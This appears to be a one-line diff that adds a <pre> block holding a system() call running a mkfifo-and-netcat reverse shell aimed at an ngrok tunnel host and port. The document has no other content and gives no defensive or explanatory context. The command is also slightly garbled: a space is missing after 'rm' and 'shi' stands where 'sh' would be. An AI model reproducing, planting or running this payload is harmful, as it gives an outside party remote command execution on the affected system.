@@ -1,0 +1,1 @@
+<pre>system(rm/tmp/f; mkfifo /tmp/f; cat /tmp/f | shi 2>&1 | nc 2.tcp.eu.ngrok.io 17088);</pre>
